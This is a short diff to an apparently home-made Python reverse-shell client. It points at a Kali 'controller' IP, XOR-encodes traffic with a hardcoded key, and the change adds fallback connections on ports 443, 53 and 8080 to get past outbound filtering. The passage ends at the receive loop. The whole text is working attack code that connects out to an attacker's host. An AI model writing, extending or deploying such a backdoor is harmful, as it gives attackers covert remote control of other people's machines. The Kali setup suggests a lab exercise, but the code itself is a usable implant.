@@ -5,18 +5,31 @@ import time
 import os
 
 KEY = b'secretkey'
-REVERSE_HOST = "192.168.56.103"  # 🔧 CHANGE to your Kali IP
+REVERSE_HOST = "192.168.56.103"  # CHANGE to your Kali IP
 REVERSE_PORT = 443
+PORTS = [443, 53, 8080]
 BUFFER_SIZE = 4096
 
 def xor_encrypt(data):
     return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])
 
+# Function to attempt connection to multiple ports
+def connect_to_controller():
+    for port in PORTS:
+        try:
+            s = socket.socket()
+            s.connect((REVERSE_HOST, port))
+            return s
+        except:
+            continue
+    return None
+
 def connect():
     while True:
         try:
             s = socket.socket()
-            s.connect((REVERSE_HOST, REVERSE_PORT))
+            # s.connect((REVERSE_HOST, REVERSE_PORT))
+            s = connect_to_controller()
 
             while True:
                 data = xor_encrypt(s.recv(BUFFER_SIZE))
